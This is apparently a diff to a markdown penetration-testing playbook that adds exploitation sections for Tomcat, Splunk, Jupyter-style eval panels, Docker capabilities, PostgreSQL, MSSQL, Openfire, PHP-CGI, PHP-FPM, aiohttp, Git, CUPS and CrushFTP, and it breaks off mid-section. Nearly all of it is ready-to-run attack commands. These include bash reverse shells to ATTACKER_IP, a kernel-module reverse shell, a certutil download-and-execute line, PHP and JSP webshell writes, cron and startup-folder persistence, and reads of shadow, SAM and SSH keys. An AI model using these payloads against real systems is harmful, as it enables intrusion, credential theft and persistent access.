@@ -49,6 +49,10 @@ Cross-references:
 - [Phase 14t: Oracle Database (TNS Listener)](#phase-14t-oracle-database-tns-listener--tcp-1521)
 - [Phase 14u: Webmin / MiniServ](#phase-14u-webmin--miniserv-tcp-10000)
 - [Phase 14v: Microsoft SQL Server (TCP 1433)](#phase-14v-microsoft-sql-server-tcp-1433)
+- [Phase 14w: Openfire XMPP Server](#phase-14w-openfire-xmpp-server-tcp-90909091)
+- [Phase 14x: PHP-CGI Argument Injection — CVE-2024-4577](#phase-14x-php-cgi-argument-injection--cve-2024-4577)
+- [Phase 14y: PHP-FPM + Nginx Underflow RCE — CVE-2019-11043](#phase-14y-php-fpm--nginx-underflow-rce--cve-2019-11043)
+- [Phase 14z: Misc App CVEs (aiohttp, Git, CUPS, CrushFTP, Erlang, daloRADIUS, OpenSMTPD, OpenTSDB, PaperCut, phpLiteAdmin, PHPUnit, ZoneMinder)](#phase-14z-openfire--misc-app-cves--continued)
 - [Phase 15: Quick Reference — osTicket / MantisBT / OpenCart / Magento](#phase-15-quick-reference--osticket--mantisbt--opencart--magento)
 - [Phase 16: Generic CVE Lookup Workflow](#phase-16-generic-cve-lookup-workflow)
 - [Quick Reference Cheatsheet](#quick-reference-cheatsheet)
@@ -132,6 +136,40 @@ python3 ghostcat.py -p 8009 -f WEB-INF/web.xml <TARGET>
 | CVE-2020-1938 | 6.x/7.x/8.x/9.x AJP enabled | Ghostcat — file read, sometimes RCE |
 | CVE-2017-12617 | 7.0.0–7.0.79 (PUT enabled) | Direct JSP upload via PUT |
 | CVE-2019-0232 | 7.0.0–9.0.17 Windows, CGIServlet | Argument injection RCE |
+
+### Reverse-Proxy Semicolon Path Traversal (..;/) — Hidden App Bypass
+
+When Tomcat sits behind Nginx, Apache, or a load balancer, the proxy normalizes paths before forwarding but Tomcat treats `;` as a path parameter delimiter. This desync lets you reach restricted contexts (`/manager`, `/host-manager`, `/examples`) that the proxy blocks by prefix match.
+
+```bash
+# Basic bypass — proxy denies /manager/html but passes /anything/..;/manager/html
+curl -s http://<TARGET>:8080/anything/..;/manager/html
+curl -s http://<TARGET>:8080/whatever/..;/manager/html -I
+curl -s http://<TARGET>:8080/foo/..;/host-manager/html -I
+
+# Double-bypass variants (when single ..;/ is filtered)
+curl -s "http://<TARGET>:8080/;param=value/manager/html"
+curl -s "http://<TARGET>:8080/..;/..;/manager/html"
+curl -s "http://<TARGET>:8080/%2e%2e;/manager/html"
+
+# Reach /examples (often left enabled, contains session-fixation demos)
+curl -s "http://<TARGET>:8080/foo/..;/examples/servlets/"
+curl -s "http://<TARGET>:8080/foo/..;/examples/jsp/snp/snoop.jsp"
+
+# Chain with default creds once /manager is reachable
+curl -u tomcat:tomcat "http://<TARGET>:8080/foo/..;/manager/text/list"
+curl -u tomcat:tomcat -T shell.war "http://<TARGET>:8080/foo/..;/manager/text/deploy?path=/pwn"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — no tools needed. Fuzz path-parameter positions manually:
+for prefix in "/a/..;" "/a/..;/" "/..;a/../" "/;/"; do
+  CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://<TARGET>:8080${prefix}/manager/html")
+  echo "$prefix/manager/html -> $CODE"
+done
+```
 
 ### Post-Exploit
 
@@ -558,10 +596,43 @@ curl -sku admin:changeme -F "name=@evil.spl" \
   https://<TARGET>:8089/services/apps/local
 ```
 
+### CVE-2024-36991 — Pre-Auth Arbitrary File Read (Windows)
+
+Splunk Enterprise on Windows < 9.2.2 / 9.1.5 / 9.0.10. The `/en-US/modules/messaging/` endpoint passes user-controlled path segments through `os.path.join` without sanitization, allowing directory traversal to read arbitrary files as the Splunk service account (often SYSTEM on Windows).
+
+```bash
+# Confirm vulnerable version first
+curl -sk https://<TARGET>:8089/services/server/info | grep -oP 'version">\K[^<]+'
+
+# Read win.ini (baseline proof)
+curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../windows/win.ini"
+
+# Read Splunk passwd file (contains hashes)
+curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../Program%20Files/Splunk/etc/passwd"
+
+# Read SAM (SYSTEM context — may be locked; try backup)
+curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../windows/repair/SAM"
+
+# Read web.conf for session signing keys
+curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../Program%20Files/Splunk/etc/system/local/web.conf"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl only — no tools needed beyond the HTTP request
+# Enumerate common sensitive files on Windows Splunk installs
+for f in "windows/win.ini" "windows/system32/drivers/etc/hosts" "Program%20Files/Splunk/etc/passwd" "Program%20Files/Splunk/etc/system/local/server.conf"; do
+  echo "=== $f ==="
+  curl -sk "https://<TARGET>:8000/en-US/modules/messaging/../../../../../../../../../$f"
+done
+```
+
 ### Common CVEs
 
 | CVE | Affected | Notes |
 |-----|----------|-------|
+| CVE-2024-36991 | Enterprise < 9.2.2 / 9.1.5 / 9.0.10 (Windows) | Pre-auth file read via os.path.join traversal |
 | CVE-2023-46214 | 9.x < 9.0.7 / 9.1.2 | XSLT RCE |
 | CVE-2022-43571 | UF / Enterprise | Arbitrary command execution |
 | CVE-2018-11409 | < 7.0.1 | Info disclosure (`/services/server/info`) |
@@ -1640,6 +1711,71 @@ cat /home/*/.jupyter/jupyter_*_config.py 2>/dev/null | grep -i password
 ```
 
 > **Why this matters for lateral movement:** Jupyter typically runs as a different user than your initial foothold. The kernel executes code as the Jupyter process owner — so exploiting it gives you a shell as that user without needing credentials. The pure-Python WebSocket script uses only stdlib (`http.client`, `socket`, `struct`) — no `pip install` required, since Python is guaranteed to exist where Jupyter runs.
+
+### 14c.2 Other Data-Analysis / Notebook Web Apps with Scripting RCE
+
+The same pattern (web-exposed eval panel → OS command execution) applies to other data platforms. Recognize any of these on a port scan and treat as immediate RCE candidates.
+
+#### Jamovi (R-based stats tool — default port 41337)
+
+Jamovi exposes the Rj Editor module which executes arbitrary R code as the jamovi process user.
+
+```bash
+# Identify Jamovi
+curl -s http://<TARGET>:41337/ | grep -i jamovi
+nmap -sV -p 41337 <TARGET>
+
+# RCE via R system() — navigate to Analyses → Rj Editor in browser, paste:
+system("id", intern=TRUE)
+system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'")
+```
+
+#### RStudio Server (default port 8787)
+
+```bash
+# Identify RStudio Server
+curl -s http://<TARGET>:8787/ | grep -i rstudio
+# Default: no default creds — uses PAM (OS accounts)
+
+# After login — Console tab executes R as the authenticated user
+system("id")
+system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'")
+
+# Terminal tab gives direct shell (no R wrapper needed)
+```
+
+#### SQL-Lab / Adminer / pgAdmin Query Console → COPY TO PROGRAM
+
+When a database web console is exposed and you have DBA access, the SQL primitive IS the RCE.
+
+```bash
+# PostgreSQL superuser — COPY TO PROGRAM (covered in enumeration-methodology.md)
+# From any SQL web console (pgAdmin, Adminer, phpPgAdmin, SQL-lab):
+COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"';
+```
+
+#### Generic Recognition Methodology
+
+```bash
+# Port-scan recognition for eval-panel apps:
+# 8888/8889 → Jupyter    | 41337 → Jamovi    | 8787 → RStudio
+# 1880 → Node-RED        | 8080 → Jenkins Groovy | 5050 → pgAdmin
+# 8088 → Apache Zeppelin | 3838/8001 → Shiny Server
+# ANY web app with a "Console", "Terminal", "Scripting", "Query" tab = eval panel candidate
+
+# Quick confirm: does it execute user-supplied code server-side?
+# If yes → OS command execution is one function call away (system/exec/spawn/COPY TO PROGRAM)
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# All of the above use the application's own built-in scripting interface as the RCE vector.
+# No external tools needed — the "exploit" is typing a command into the app's eval box.
+# From a reverse shell already on the box, identify running eval-panel services:
+ss -tlnp | grep -E ':(8888|8787|41337|1880|8080|5050|8088)\b'
+ps aux | grep -iE 'jupyter|rstudio|jamovi|node-red|pgadmin|zeppelin'
+```
 
 ---
 
@@ -2731,8 +2867,69 @@ gcc shocker.c -o shocker
 ps -ef
 gdb -p <HOST_PID>
 
-# CAP_SYS_MODULE — load kernel module
-insmod evil.ko
+# CAP_SYS_MODULE — load kernel module for host-level code execution
+# Step 1: check kernel headers version on target
+uname -r
+ls /lib/modules/$(uname -r)/build/ 2>/dev/null
+
+# Step 2: write the LKM source (call_usermodehelper runs as root on the HOST)
+cat > /tmp/evil.c << 'EOF'
+#include <linux/module.h>
+#include <linux/kmod.h>
+MODULE_LICENSE("GPL");
+static int __init evil_init(void) {
+    char *argv[] = {"/bin/sh", "-c", "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1", NULL};
+    char *envp[] = {"HOME=/root", "PATH=/usr/bin:/bin:/sbin", NULL};
+    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    return 0;
+}
+static void __exit evil_exit(void) {}
+module_init(evil_init);
+module_exit(evil_exit);
+EOF
+
+# Step 3: write the Makefile
+cat > /tmp/Makefile << 'EOF'
+obj-m += evil.o
+all:
+	make -C /lib/modules/$(shell uname -r)/build M=/tmp modules
+clean:
+	make -C /lib/modules/$(shell uname -r)/build M=/tmp clean
+EOF
+
+# Step 4: compile and load
+cd /tmp && make 2>/dev/null
+insmod /tmp/evil.ko
+```
+
+### Docker Toolbox / Boot2Docker — Container-to-Windows-Host Pivot
+
+Docker Toolbox (legacy Windows 7/8/10 Home) runs containers inside a VirtualBox VM (`default`) running Boot2Docker (Tiny Core Linux). The VM has default SSH credentials and mounts `C:\Users` at `/c/Users`. If you escape into the Boot2Docker VM, you can read/write the Windows host filesystem.
+
+```bash
+# From inside a container on Docker Toolbox, identify the host gateway (VirtualBox NAT)
+ip route | grep default    # typically 10.0.2.2 or 192.168.99.1
+
+# SSH into the Boot2Docker VM with default creds
+ssh docker@<GATEWAY_IP>    # password: tcuser
+# Or from the container directly:
+ssh docker@192.168.99.100  # default Docker Toolbox VM IP; password: tcuser
+
+# Once inside Boot2Docker VM — access Windows host filesystem
+ls /c/Users/
+cat /c/Users/<WINDOWS_USER>/Desktop/flag.txt
+cat /c/Users/<WINDOWS_USER>/.ssh/id_rsa
+
+# Write to Windows host (e.g., startup folder for persistence demo)
+echo "powershell -e <BASE64>" > "/c/Users/<WINDOWS_USER>/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/pwn.bat"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure ssh (present in most container images or installable via apk/apt inside container)
+# The entire chain uses only ssh + filesystem access — no external tools
+ssh -o StrictHostKeyChecking=no docker@192.168.99.100 'cat /c/Users/*/Desktop/*.txt'
 ```
 
 ### Container Escape — Mounted /var/run/docker.sock
@@ -3893,6 +4090,37 @@ psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c \
   "SELECT lo_export(content, '<APP_PATH>') FROM pwn;"
 ```
 
+### Non-Superuser File Write — `pg_write_server_files` Role
+
+PostgreSQL 11+ introduced predefined roles. A user granted `pg_write_server_files` can use `COPY ... TO` for arbitrary file write without needing superuser. This is weaker than `lo_export` (which is DBA-only) but often granted to application accounts that manage data exports.
+
+```bash
+# Check if current user has the role
+psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c \
+  "SELECT pg_has_role(current_user, 'pg_write_server_files', 'MEMBER');"
+
+# Write a PHP webshell (when PG host also serves web content)
+psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c \
+  "COPY (SELECT '<?php system(\$_GET[\"c\"]); ?>') TO '/var/www/html/shell.php';"
+
+# Write an SSH authorized_keys file (postgres user home)
+psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c \
+  "COPY (SELECT 'ssh-rsa <YOUR_PUBLIC_KEY> pwn') TO '/var/lib/postgresql/.ssh/authorized_keys';"
+
+# Write a cron job for reverse shell
+psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c \
+  "COPY (SELECT '* * * * * postgres bash -c \"bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1\"') TO '/etc/cron.d/pwn';"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure psql — no external tools. The COPY TO statement IS the LOTL primitive.
+# Confirm writable paths first:
+psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c "COPY (SELECT 'test') TO '/tmp/write_test';"
+psql -h <TARGET> -U <USER> -d <INTERNAL_DB> -c "SELECT pg_read_file('/tmp/write_test');"
+```
+
 > **Tip:** `lo_export` will silently no-op if the target path is unwritable by the postgres process user. Confirm the write with a follow-up `pg_read_binary_file` against the same path before triggering.
 
 ### Trigger / Coercion
@@ -4387,6 +4615,49 @@ SELECT srvname, isremote FROM sysservers;
 SELECT * FROM master..sysservers;
 ```
 
+#### Domain SID Enumeration via `SUSER_SID()` (No LDAP/SMB/Kerberos Needed)
+
+When MSSQL is domain-joined, `SUSER_SID()` resolves any domain principal to its binary SID without requiring LDAP/SMB/Kerberos access. Useful when those protocols are firewalled but SQL is reachable.
+
+```sql
+-- Extract the domain SID (first 48 bytes = domain SID; last 4 bytes = user RID)
+SELECT SUSER_SID('<DOMAIN>\Domain Admins');
+-- Convert to readable format
+SELECT CONVERT(VARCHAR(100), SUSER_SID('<DOMAIN>\Domain Admins'), 1);
+
+-- Extract domain SID base (RID 500 = Administrator, known RID)
+SELECT SUSER_SID('<DOMAIN>\Administrator');
+
+-- Enumerate users by RID brute (RIDs 500-1200 cover most accounts)
+-- Build the binary SID: domain_sid_base + little-endian RID
+DECLARE @i INT = 500;
+WHILE @i < 1200 BEGIN
+  BEGIN TRY
+    SELECT @i AS RID, SUSER_SNAME(SUSER_SID('<DOMAIN>\Administrator') + CAST(@i - 500 AS VARBINARY(4)));
+  END TRY BEGIN CATCH END CATCH
+  SET @i = @i + 1;
+END
+
+-- Simpler: resolve known group names to confirm domain trust
+SELECT SUSER_SNAME(SUSER_SID('<DOMAIN>\Domain Users'));
+SELECT SUSER_SNAME(SUSER_SID('<DOMAIN>\Domain Computers'));
+SELECT SUSER_SNAME(SUSER_SID('<DOMAIN>\Enterprise Admins'));
+```
+
+```bash
+# From impacket-mssqlclient — one-shot domain SID extraction
+impacket-mssqlclient <USER>:<PASSWORD>@<TARGET> -windows-auth -q \
+  "SELECT CONVERT(VARCHAR(100), SUSER_SID('<DOMAIN>\Domain Admins'), 1);"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```sql
+-- Pure T-SQL — no external tools. SUSER_SID/SUSER_SNAME are built-in functions.
+-- Reverse-lookup: given a SID, return the principal name
+SELECT SUSER_SNAME(0x0105000000000005150000003E962C7A11A4975B649E2C5E01020000);
+```
+
 #### `xp_cmdshell` — Direct Command Execution (sysadmin)
 
 ```sql
@@ -4618,6 +4889,684 @@ netexec winrm <TARGET> -u '<MSSQL_SVC_ACCOUNT>' -p '<PASSWORD>'
 > **OPSEC:** `xp_cmdshell` spawns `cmd.exe` as child of `sqlservr.exe` — high-signal in EDR. CLR Assembly + OLE Automation execute in-process and are quieter. `xp_dirtree` to attacker-controlled SMB is the cleanest hash-grab and leaves only an outbound SMB connection in the logs.
 
 [↑ Back to top](#table-of-contents)
+
+---
+
+## Phase 14w: Openfire XMPP Server (TCP 9090/9091)
+
+Openfire is a Java-based XMPP (Jabber) messaging server with a web admin console on port 9090 (HTTP) / 9091 (HTTPS). CVE-2023-32315 provides unauthenticated admin access via path traversal in the setup environment, after which plugin upload gives RCE as the Openfire service user (often SYSTEM on Windows).
+
+### Enumeration
+
+```bash
+nmap -sV -p 9090,9091,5222,5223,5269 <TARGET>
+curl -s http://<TARGET>:9090/login.jsp | grep -iE 'openfire|version'
+curl -s http://<TARGET>:9090/setup/setup-/../../log.jsp    # CVE-2023-32315 path traversal probe
+```
+
+### Default Credentials
+
+```text
+admin:admin
+admin:password
+admin:openfire
+```
+
+### CVE-2023-32315 — Path Traversal Authentication Bypass
+
+Openfire < 4.7.5 / 4.6.8. The path `/setup/setup-/../../<page>` bypasses the auth filter because the setup environment path is exempt from session checks.
+
+```bash
+# Confirm bypass — should return admin console content without auth
+curl -s "http://<TARGET>:9090/setup/setup-/../../index.jsp" | grep -i 'Server Name'
+
+# Create an admin user via the unauthenticated setup path
+curl -s -X POST "http://<TARGET>:9090/setup/setup-/../../user-create.jsp" \
+  -d "username=pwnadmin&password=Pwn123!&passwordConfirm=Pwn123!&isadmin=true&create=Create+Admin"
+
+# Or grab an existing admin session — add a new admin via the bypass
+curl -s -c cookies.txt "http://<TARGET>:9090/setup/setup-/../../login.jsp"
+curl -s -b cookies.txt -X POST "http://<TARGET>:9090/setup/setup-/../../login.jsp" \
+  -d "url=%2Findex.jsp&login=true&username=admin&password=admin"
+```
+
+### Exploitation — Plugin Upload RCE (Post-Auth or Post-Bypass)
+
+```bash
+# Openfire plugins are .jar files deployed via /plugin-admin.jsp
+# Method 1: Use the management tool plugin (openfire-management-tool-plugin)
+# Download from: https://github.com/miko550/CVE-2023-32315 (contains pre-built .jar)
+
+# Upload plugin via admin console
+curl -s -b cookies.txt -X POST "http://<TARGET>:9090/setup/setup-/../../plugin-admin.jsp" \
+  -F "uploadfile=@openfire-management-tool-plugin.jar"
+
+# After upload, access the management tool webshell at:
+curl -s "http://<TARGET>:9090/plugins/openfire-management-tool/cmd.jsp?cmd=id"
+curl -s "http://<TARGET>:9090/plugins/openfire-management-tool/cmd.jsp?cmd=whoami"
+
+# Reverse shell
+curl -s "http://<TARGET>:9090/plugins/openfire-management-tool/cmd.jsp?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>%200%3E%261%27"
+```
+
+```bash
+# Method 2: Build custom plugin .jar with embedded webshell
+mkdir -p plugin/lib
+cat > plugin/plugin.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<plugin>
+  <class>com.example.Pwn</class>
+  <name>pwn</name>
+  <description>pwn</description>
+  <version>1.0.0</version>
+  <minServerVersion>4.0.0</minServerVersion>
+</plugin>
+EOF
+# Include a JSP webshell in plugin/web/cmd.jsp
+mkdir -p plugin/web
+echo '<%Runtime.getRuntime().exec(request.getParameter("c"));%>' > plugin/web/cmd.jsp
+cd plugin && jar cf ../pwn.jar * && cd ..
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — the path traversal bypass + plugin upload chain uses only HTTP requests
+# No specialized tools needed beyond curl and a pre-built .jar file
+curl -s "http://<TARGET>:9090/setup/setup-/../../system-properties.jsp" | grep -i version
+```
+
+### Post-Exploit
+
+```bash
+# Openfire on Windows often runs as SYSTEM via service wrapper
+whoami
+# Config file with DB creds
+cat /opt/openfire/conf/openfire.xml 2>/dev/null
+type "C:\Program Files\Openfire\conf\openfire.xml" 2>nul
+# Contains: <connectionProvider> with JDBC URL, username, password (often plaintext)
+```
+
+---
+
+## Phase 14x: PHP-CGI Argument Injection — CVE-2024-4577
+
+PHP-CGI on Windows with specific ANSI code pages (Japanese 932, Simplified Chinese 936, Traditional Chinese 950) mishandles the Windows "best-fit" character mapping. The soft-hyphen `%AD` maps to a real hyphen `-`, allowing argument injection into the PHP-CGI binary. This bypasses the CVE-2012-1823 fix. Pre-auth RCE when PHP runs in CGI mode behind Apache/IIS.
+
+### Enumeration
+
+```bash
+# Identify PHP-CGI (response headers)
+curl -sI http://<TARGET>/ | grep -iE 'X-Powered-By|Server'
+# PHP/8.x + Apache on Windows = candidate
+
+# Confirm CGI mode — phpinfo page or error responses mentioning cgi
+curl -s http://<TARGET>/phpinfo.php | grep -i 'Server API.*CGI'
+curl -s "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
+  --data '<?php echo "CVE-2024-4577"; ?>'
+```
+
+### Exploitation
+
+```bash
+# RCE via auto_prepend_file=php://input — injects PHP from POST body
+curl -s -X POST "http://<TARGET>/php-cgi/php-cgi.exe?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
+  --data '<?php system("whoami"); ?>'
+
+# Alternative path (when php-cgi.exe is mapped differently)
+curl -s -X POST "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
+  --data '<?php system("whoami"); ?>'
+
+# Reverse shell (Windows)
+curl -s -X POST "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
+  --data '<?php system("powershell -e <BASE64_PAYLOAD>"); ?>'
+
+# Reverse shell (if target is Windows with bash via MSYS/Git)
+curl -s -X POST "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
+  --data '<?php system("certutil -urlcache -split -f http://<ATTACKER_IP>/shell.exe C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe"); ?>'
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl — the exploit IS a single HTTP request with crafted query string
+# No tools beyond curl needed. The %AD byte is the entire bypass.
+curl -s "http://<TARGET>/index.php?%ADd+allow_url_include%3DOn+%ADd+auto_prepend_file%3Dphp://input" \
+  -d '<?php echo shell_exec("dir C:\\Users"); ?>'
+```
+
+### Common CVEs
+
+| CVE | Affected | Notes |
+|-----|----------|-------|
+| CVE-2024-4577 | PHP < 8.3.8 / 8.2.20 / 8.1.29 on Windows (code pages 932/936/950) | Argument injection via best-fit mapping |
+| CVE-2012-1823 | PHP < 5.3.12 / 5.4.2 CGI | Original CGI argument injection (patched; 4577 bypasses it) |
+
+---
+
+## Phase 14y: PHP-FPM + Nginx Underflow RCE — CVE-2019-11043
+
+Nginx + PHP-FPM with a `fastcgi_split_path_info` regex that can produce an empty `PATH_INFO` causes a buffer underflow in FPM, allowing env-var overwrite and ultimately arbitrary PHP code execution. Exploitable when the Nginx config uses a regex like `^(.+\.php)(/.*)$` and the FPM worker pool is reachable.
+
+### Enumeration
+
+```bash
+# Identify Nginx + PHP-FPM (response headers)
+curl -sI http://<TARGET>/ | grep -iE 'Server|X-Powered-By'
+
+# Probe for the vulnerable config (a trailing path that triggers empty PATH_INFO)
+curl -sI "http://<TARGET>/index.php/anything%0a.php"
+# 502 Bad Gateway or crash = likely vulnerable fastcgi_split_path_info config
+```
+
+### Exploitation
+
+```bash
+# phuip-fpizdam — the canonical exploit tool
+# Pre-compiled binary assumed available in engagement toolkit
+./phuip-fpizdam "http://<TARGET>/index.php"
+
+# After successful exploitation, the tool sets PHP_VALUE to enable code execution
+# Access the backdoor path:
+curl "http://<TARGET>/index.php?a=id"
+
+# Reverse shell after backdoor is planted
+curl "http://<TARGET>/index.php?a=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT>%200%3E%261%27"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The exploit requires sending many requests with specific newline positions to trigger
+# the underflow. Without the phuip-fpizdam binary, manual exploitation is impractical.
+# Minimal alternative: confirm vulnerability by observing 502s on crafted paths
+for i in $(seq 1 50); do
+  CODE=$(curl -s -o /dev/null -w '%{http_code}' "http://<TARGET>/index.php/$(printf 'A%.0s' $(seq 1 $i))%0a.php")
+  echo "pad=$i code=$CODE"
+done
+# Consistent 502s at certain padding lengths confirm the bug
+```
+
+### Common CVEs
+
+| CVE | Affected | Notes |
+|-----|----------|-------|
+| CVE-2019-11043 | PHP-FPM < 7.3.11 / 7.2.24 + Nginx with fastcgi_split_path_info | Buffer underflow → env overwrite → RCE |
+
+---
+
+## Phase 14z: Openfire / Misc App CVEs — Continued
+
+### 14z.1 aiohttp Static-Resource Path Traversal — CVE-2024-23334
+
+aiohttp < 3.9.2 web applications that serve static files with `follow_symlinks=True` allow path traversal to read arbitrary files outside the static root. The traversal bypasses the static-route prefix check.
+
+```bash
+# Identify aiohttp (server header)
+curl -sI http://<TARGET>:<PORT>/ | grep -i server
+# Server: Python/3.x aiohttp/3.x.x
+
+# Traversal — the static route path + /../../../etc/passwd
+# Common static route prefixes: /static, /assets, /files, /public
+curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../etc/passwd"
+curl --path-as-is "http://<TARGET>:<PORT>/assets/../../../../../etc/passwd"
+
+# If the app uses a non-standard static prefix, fuzz it:
+for p in /static /assets /files /public /media /resources; do
+  CODE=$(curl -s -o /dev/null -w '%{http_code}' --path-as-is "http://<TARGET>:<PORT>${p}/../../../../../etc/passwd")
+  echo "$p -> $CODE"
+done
+
+# Read sensitive files
+curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../etc/shadow"
+curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../proc/self/environ"
+curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../home/<USER>/.ssh/id_rsa"
+curl --path-as-is "http://<TARGET>:<PORT>/static/../../../../../app/.env"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Pure curl with --path-as-is (prevents curl from normalizing the ../ sequences)
+# No tools beyond curl needed
+curl --path-as-is "http://<TARGET>:<PORT>/static/..%2f..%2f..%2f..%2f..%2fetc/passwd"
+```
+
+### 14z.2 Git Recursive-Clone RCE — CVE-2024-32002
+
+Git < 2.45.1 / 2.44.1 / 2.43.4 / 2.42.2 / 2.41.1 / 2.40.2 / 2.39.4 on case-insensitive filesystems (Windows, macOS). A malicious repository with a submodule whose path component uses case-folding to create a symlink pointing into `.git/`, combined with a `post-checkout` hook in the submodule, achieves RCE on `git clone --recurse-submodules`.
+
+```bash
+# Exploitation scenario: attacker controls a Gitea/GitLab/GitHub repo that a target clones
+# The malicious repo structure:
+#   .gitmodules → submodule path = "A/modules/x" with URL pointing to hook-carrying repo
+#   A symlink named "a" → ".git/modules/A/modules/x"
+#   The submodule repo contains: hooks/post-checkout with arbitrary commands
+
+# If you find a Gitea/GitLab instance that auto-clones repos (CI/CD, mirroring):
+# 1. Create the malicious repo structure
+mkdir exploit-repo && cd exploit-repo
+git init
+git submodule add --name x <ATTACKER_REPO_URL> A/modules/x
+# Create symlink that exploits case-insensitivity: 'a' -> '.git/modules/A/modules/x'
+# (on attacker Linux box, force the symlink into the tree object)
+git update-index --add --cacheinfo 120000,$(echo -n "../.git/modules/A/modules/x" | git hash-object -w --stdin),a
+
+# 2. The submodule repo (<ATTACKER_REPO_URL>) contains:
+mkdir -p hooks
+cat > hooks/post-checkout << 'EOF'
+#!/bin/sh
+curl http://<ATTACKER_IP>:<ATTACKER_PORT>/pwned?h=$(hostname)
+bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1
+EOF
+chmod +x hooks/post-checkout
+git add hooks/post-checkout && git commit -m "hook"
+
+# 3. Target clones with --recurse-submodules → hook fires
+# git clone --recurse-submodules http://<GITEA_TARGET>/attacker/exploit-repo.git
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The exploit triggers automatically on `git clone --recurse-submodules` — no post-clone
+# action needed. If you control a repo the target mirrors/clones, the hook fires on their end.
+# Detection: look for git version < 2.45.1 on target
+git --version    # from a shell on the target
+```
+
+### 14z.3 CUPS Unauth RCE Chain — CVE-2024-47176 / 47076 / 47175 / 47177
+
+The CUPS printing subsystem (cups-browsed listening on UDP 631) can be coerced into fetching a malicious PPD from an attacker-controlled IPP server. The PPD injects commands via `FoomaticRIPCommandLine` which execute when a user prints to the attacker-added printer.
+
+```bash
+# Detection — cups-browsed listens on UDP 631, accepting unauthenticated printer advertisements
+nmap -sU -p 631 <TARGET>
+# If open: cups-browsed is running and accepting remote printer ads
+
+# Confirm CUPS version
+curl -s http://<TARGET>:631/ | grep -iE 'CUPS|version'
+lpstat -r 2>/dev/null    # from a shell on target
+
+# Exploitation with evil-cups (https://github.com/IppSec/evil-cups)
+# Pre-built Python script — runs an IPP server that serves a malicious PPD
+python3 evil-cups.py <ATTACKER_IP> <TARGET> "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'"
+
+# The exploit:
+# 1. Sends a UDP packet to <TARGET>:631 advertising a new printer at http://<ATTACKER_IP>:12345/printers/pwn
+# 2. cups-browsed fetches the PPD from attacker's IPP server
+# 3. PPD contains FoomaticRIPCommandLine with the injected command
+# 4. Command executes when ANY user prints to the new printer (or when cups auto-tests it)
+
+# Trigger manually if auto-trigger doesn't fire:
+# From a shell on target (after the printer is added):
+echo test | lp -d <PRINTER_NAME>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The UDP advertisement can be sent with pure Python (socket module) — no tools needed
+python3 -c "
+import socket
+PKT = b'0 3 http://<ATTACKER_IP>:12345/printers/pwn \"pwn\" \"pwn\" \"MFG:Evil;MDL:Printer;\"'
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.sendto(PKT, ('<TARGET>', 631))
+s.close()
+print('[+] Advertisement sent')
+"
+# You still need to serve the malicious IPP/PPD — minimal Python HTTP server suffices
+```
+
+### 14z.4 CrushFTP Authentication Bypass — CVE-2025-31161
+
+CrushFTP < 10.7.1 / 11.1.0 has a race condition in AWS4-HMAC-SHA256 authentication header processing. Sending a crafted `Authorization: AWS4-HMAC-SHA256` header with a specific `Credential` value triggers a session assignment for an arbitrary user before auth validation completes.
+
+```bash
+# Identify CrushFTP
+curl -sI http://<TARGET>:8080/ | grep -iE 'server|crushftp'
+nmap -sV -p 8080,443,9090 <TARGET>
+
+# Exploit — race-condition auth bypass to get an admin session
+# Send the crafted AWS4 header — the server assigns a session for 'crushadmin' before validating
